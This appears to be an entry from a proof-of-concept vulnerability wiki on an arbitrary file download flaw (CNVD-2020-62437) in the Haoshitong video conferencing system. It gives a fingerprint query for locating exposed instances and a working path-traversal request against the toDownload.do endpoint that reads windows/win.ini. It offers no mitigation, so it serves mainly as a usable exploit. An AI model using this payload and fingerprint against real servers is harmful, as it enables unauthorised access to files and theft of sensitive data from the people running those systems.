# Yinpeng Cloud Computing Haoshitong Video Conferencing System Any file download CNVD-2020-62437

## Vulnerability Description

Yinpeng Cloud Computing Haoshitong Video Conferencing System There is any file download, and attackers can obtain sensitive information through vulnerabilities

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Yinpeng Cloud Computing Haoshitong Video Conferencing System</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="Hanming-Video-Conferencing"</span>

## Vulnerability reappears

The login page is as follows

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313160033985.png)



The vulnerability is

```plain
https://xxx.xxx.xxx.xxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313160033783.png)



## 